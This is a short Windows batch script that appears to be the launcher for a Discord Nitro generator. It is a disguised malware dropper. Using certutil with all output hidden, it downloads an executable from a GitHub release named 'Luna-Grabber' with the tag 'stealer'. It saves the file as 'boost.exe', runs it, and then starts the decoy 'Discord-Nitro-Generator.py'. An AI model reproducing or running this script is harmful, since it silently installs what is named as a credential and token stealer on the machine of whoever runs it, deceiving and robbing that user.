@echo off
set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
set "Dossier=tool"
set "NomFichier=%Dossier%\boost.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)
cd tool
python Discord-Nitro-Generator.py
